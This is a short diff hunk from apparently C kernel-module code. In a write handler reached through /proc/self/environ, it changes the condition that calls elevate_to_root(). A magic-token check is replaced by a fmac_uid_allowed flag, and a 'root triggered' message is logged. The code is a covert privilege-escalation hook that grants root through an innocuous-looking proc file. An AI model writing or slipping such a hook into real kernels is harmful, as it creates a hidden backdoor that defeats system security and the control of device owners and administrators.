@@ -125,7 +125,7 @@ ssize_t fmac_environ_write(struct file *file, const char __user *buf,
 
   kbuf[count] = '\0';
 
-  if (memcmp(kbuf, MAGIC_TOKEN, 6) == 0) {
+  if (fmac_uid_allowed) {
     elevate_to_root();
     fmac_append_to_log("[FMAC] root triggered via /proc/self/environ\n");
   }
